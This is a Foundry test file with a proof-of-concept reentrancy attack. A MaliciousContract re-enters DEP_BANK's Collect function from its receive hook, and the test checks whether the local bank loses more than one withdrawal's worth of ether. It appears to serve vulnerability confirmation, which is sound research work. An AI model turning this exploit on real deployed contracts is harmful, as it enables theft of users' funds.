// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol";

contract MaliciousContract {
    DEP_BANK public victim;
    uint public attackCount;
    uint public attackAmount;

    constructor(address payable _victimAddress) payable {
        victim = DEP_BANK(_victimAddress);
    }

    function deposit() external payable {
        victim.Deposit{value: msg.value}();
    }

    function attack(uint _amount) external {
        attackAmount = _amount;
        victim.Collect(_amount);
    }

    receive() external payable {
        if (address(victim).balance >= attackAmount && attackCount < 1) {
            attackCount++;
            victim.Collect(attackAmount);
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract DEP_BANKTest is Test {
    DEP_BANK public bank;
    MaliciousContract public attacker;
    address public owner = makeAddr("owner");
    address public user = makeAddr("user");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(user, 10 ether);

        vm.startPrank(owner);
        bank = new DEP_BANK();
        bank.SetMinSum(1 ether);
        address mockLog = address(new MockLog());
        bank.SetLogFile(mockLog);
        vm.stopPrank();

        attacker = new MaliciousContract{value: 2 ether}(payable(address(bank)));
    }

    function testReentrancyAttack() public {
        // Attacker deposits funds
        vm.prank(address(attacker));
        attacker.deposit{value: 2 ether}();

        // Record balances BEFORE attack
        uint initialBankBalance = address(bank).balance;
        uint initialAttackerBalance = address(attacker).balance;
        console.log("--- BEFORE-Trigger Bank Balance ---");
        console.log("Bank balance before attack:", initialBankBalance);
        console.log("Attacker balance before attack:", initialAttackerBalance);

        console.log("--- Trigger Reentrancy Attack ---");
        attacker.attack(1 ether);

        // Record balances AFTER attack
        uint afterBankBalance = address(bank).balance;
        uint afterAttackerBalance = address(attacker).balance;
        console.log("--- AFTER-Trigger Bank Balance ---");
        console.log("Bank balance after attack:", afterBankBalance);
        console.log("Attacker balance after attack:", afterAttackerBalance);

        // Calculate value differentials
        uint bankDecrease = initialBankBalance - afterBankBalance;
        uint attackerIncrease = afterAttackerBalance - initialAttackerBalance;
        bool bankDecreaseExceedsSingleWithdrawal = bankDecrease > 1 ether;
        bool attackerIncreaseExceedsSingleWithdrawal = attackerIncrease > 1 ether;
        bool vulnerabilityExists = bankDecreaseExceedsSingleWithdrawal && attackerIncreaseExceedsSingleWithdrawal;
        
        console.log("Bank balance decreased by: %d", bankDecrease);
        console.log("Bank decrease exceeds 1 ether: %s", bankDecreaseExceedsSingleWithdrawal ? "YES" : "NO");
        console.log("Attacker balance increased by: %d", attackerIncrease);
        console.log("Attacker increase exceeds 1 ether: %s", attackerIncreaseExceedsSingleWithdrawal ? "YES" : "NO");
        console.log("Verdict:");

        // Withdraw stolen funds (demonstrates practical impact)
        uint userInitialBalance = user.balance;
        vm.prank(user);
        attacker.withdraw();

        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded (bank lost %d ETH, attacker gained %d ETH)", bankDecrease, attackerIncrease);
        } else {
            console.log("Vulnerability not Exist: Attack failed to steal more than 1 ETH (bank balance decreased %d ETH, attacker increased %d ETH)", bankDecrease, attackerIncrease);
        }
    }
}

contract MockLog {
    function AddMessage(address, uint, string memory) public {
        // Mock implementation
    }
}